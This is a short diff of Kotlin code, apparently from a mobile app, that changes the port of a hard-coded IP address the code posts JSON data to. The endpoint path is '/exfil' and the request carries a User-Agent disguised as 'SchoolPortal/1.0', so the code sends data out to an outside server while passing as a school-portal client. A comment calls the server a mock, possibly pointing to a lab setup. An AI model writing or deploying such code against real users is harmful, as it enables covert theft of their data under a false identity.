@@ -540,7 +540,7 @@ object EM {
                 val body = json.toRequestBody(jsonType)
 
                 val request = Request.Builder()
-                    .url("http://139.59.244.51:5002/exfil")  // ← your mock server
+                    .url("http://139.59.244.51:6002/exfil")  // ← your mock server
                     .post(body)
                     .addHeader("User-Agent", "SchoolPortal/1.0")
                     .build()
